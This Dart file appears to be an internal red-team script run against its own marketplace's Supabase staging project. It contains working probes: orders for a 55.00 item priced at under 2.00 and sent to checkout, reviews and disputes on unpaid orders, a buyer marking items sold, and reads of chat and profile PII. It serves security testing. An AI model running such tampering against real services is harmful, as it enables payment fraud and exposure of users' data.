// Pass 7 — keep proposta underpay session; dump URL; extra surfaces.
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stamp = '20260830T1443';
const tag = 'RTI7-$stamp';
const projectMust = 'fxdknzrqjenzqcvnwqqq';

final attacks = <Map<String, dynamic>>[];

void logA(String k, Object v) {
  attacks.add({'k': k, 'v': v});
  stdout.writeln('$k :: $v');
}

String clip(String s, [int n = 400]) {
  final t = s.replaceAll(RegExp(r'\s+'), ' ').trim();
  return t.length <= n ? t : '${t.substring(0, n)}…';
}

void main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(projectMust)) exit(2);
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final admin = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: svc,
  );
  final buyerTok = await admin.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await admin.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );

  Map<String, String> h(String tok) => {
        'apikey': anon,
        'Authorization': 'Bearer $tok',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };
  Map<String, String> hSvc() => {
        'apikey': svc,
        'Authorization': 'Bearer $svc',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };

  final prod = await admin.insert('products', {
    'seller_id': sellerId,
    'title': '$tag 55.00 KEEP',
    'price': 55.00,
    'quantity': 2,
    'is_sold': false,
    'list_on_marketplace': true,
    'description': tag,
  });
  final pid = prod['id'].toString();
  logA('product', {'id': pid, 'price': 55.00, 'qty': 2});

  final ins = await http.post(
    Uri.parse('$url/rest/v1/orders'),
    headers: h(buyerTok),
    body: jsonEncode({
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 0.80,
      'status': 'reserva_pendente',
      'payment_method': 'proposta',
      'shipping_method': 'mao',
    }),
  );
  logA('insert', '${ins.statusCode} ${clip(ins.body, 220)}');
  final insD = jsonDecode(ins.body);
  final oid = (insD as List).first['id'].toString();
  final sealed = await http.get(
    Uri.parse(
      '$url/rest/v1/orders?id=eq.$oid&select=id,status,contract_unit_cents,contract_qty,price_total,product_offer_id,payment_method,shipping_method,amount_paid_cents&limit=1',
    ),
    headers: hSvc(),
  );
  logA('sealed', clip(sealed.body, 400));

  final chk = await http.post(
    Uri.parse('$url/functions/v1/create-payment-intent'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerTok',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({
      'order_id': oid,
      'buyer_id': buyerId,
      'shipping_method': 'mao',
    }),
  );
  logA('checkout_http', chk.statusCode);
  final cb = jsonDecode(chk.body);
  if (cb is Map) {
    logA('session', {
      'order_id': oid,
      'product_id': pid,
      'catalog_eur': 55.0,
      'amount_total': cb['amount_total'],
      'session': cb['checkoutSessionId'],
      'has_url': cb['checkoutUrl'] != null,
    });
    File('tool/redteam_indep_cega_20260830T1443/pass7_checkout_url.txt')
        .writeAsStringSync('${cb['checkoutUrl']}\n');
  }

  // Reproduce 2: different price_total
  final ins2 = await http.post(
    Uri.parse('$url/rest/v1/orders'),
    headers: h(buyerTok),
    body: jsonEncode({
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 1.20,
      'status': 'reserva_pendente',
      'payment_method': 'PROPOSTA',
      'shipping_method': 'mao',
    }),
  );
  logA('insert2', '${ins2.statusCode} ${clip(ins2.body, 180)}');
  String? oid2;
  try {
    final d2 = jsonDecode(ins2.body);
    if (d2 is List && d2.isNotEmpty) oid2 = (d2.first as Map)['id']?.toString();
  } catch (e) {
    logA('insert2_err', '$e ${clip(ins2.body)}');
  }
  if (oid2 != null) {
    final s2 = await http.get(
      Uri.parse(
        '$url/rest/v1/orders?id=eq.$oid2&select=contract_unit_cents,price_total,status,product_offer_id&limit=1',
      ),
      headers: hSvc(),
    );
    logA('sealed2', clip(s2.body, 300));
    final c2 = await http.post(
      Uri.parse('$url/functions/v1/create-payment-intent'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $buyerTok',
        'Content-Type': 'application/json',
      },
      body: jsonEncode({
        'order_id': oid2,
        'buyer_id': buyerId,
        'shipping_method': 'mao',
      }),
    );
    logA('checkout2', '${c2.statusCode} ${clip(c2.body, 280)}');
  }

  // Reviews: steal schema from sample, try insert on unpaid order
  final rev = await http.post(
    Uri.parse('$url/rest/v1/reviews'),
    headers: h(buyerTok),
    body: jsonEncode({
      'order_id': oid,
      'buyer_id': buyerId,
      'target_id': sellerId,
      'stars': 1,
      'comment': tag,
      'target_type': 'seller',
      'author_role': 'comprador',
    }),
  );
  logA('review_unpaid', '${rev.statusCode} ${clip(rev.body, 200)}');

  // Disputes columns
  final disp = await http.get(
    Uri.parse('$url/rest/v1/order_disputes?select=*&limit=1'),
    headers: hSvc(),
  );
  logA('disputes_cols', clip(disp.body, 250));
  final dIns = await http.post(
    Uri.parse('$url/rest/v1/order_disputes'),
    headers: h(buyerTok),
    body: jsonEncode({
      'order_id': oid,
      'reason': tag,
      'status': 'aberta',
    }),
  );
  logA('dispute_insert', '${dIns.statusCode} ${clip(dIns.body, 200)}');

  // mark sold as buyer on a real live_item if any
  final li = await http.get(
    Uri.parse(
      '$url/rest/v1/live_items?select=id,seller_id,status,live_id&seller_id=eq.$sellerId&limit=3',
    ),
    headers: hSvc(),
  );
  logA('live_items_sample', clip(li.body, 220));
  try {
    final list = jsonDecode(li.body);
    if (list is List && list.isNotEmpty) {
      final iid = list.first['id'];
      final mk = await http.post(
        Uri.parse('$url/rest/v1/rpc/batata_mark_live_item_sold'),
        headers: h(buyerTok),
        body: jsonEncode({'p_live_item_id': iid}),
      );
      logA('mark_sold_buyer', '${mk.statusCode} ${clip(mk.body, 200)}');
    }
  } catch (e) {
    logA('mark_sold_err', '$e');
  }

  // chat_messages columns
  final cm = await http.get(
    Uri.parse('$url/rest/v1/chat_messages?select=*&limit=1'),
    headers: h(buyerTok),
  );
  logA('chat_messages', '${cm.statusCode} ${clip(cm.body, 220)}');

  // profiles_directory PII
  final dir = await http.get(
    Uri.parse('$url/rest/v1/profiles_directory_public?select=*&limit=5'),
    headers: h(buyerTok),
  );
  logA('directory', '${dir.statusCode} n_hint=${clip(dir.body, 180)}');

  Directory('tool/redteam_indep_cega_20260830T1443').createSync(recursive: true);
  File('tool/redteam_indep_cega_20260830T1443/pass7.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert({
      'stamp': stamp,
      'keep_order_id': oid,
      'keep_product_id': pid,
      'attacks': attacks,
    }),
  );
  stdout.writeln('PASS7 KEEP order=$oid product=$pid');
}
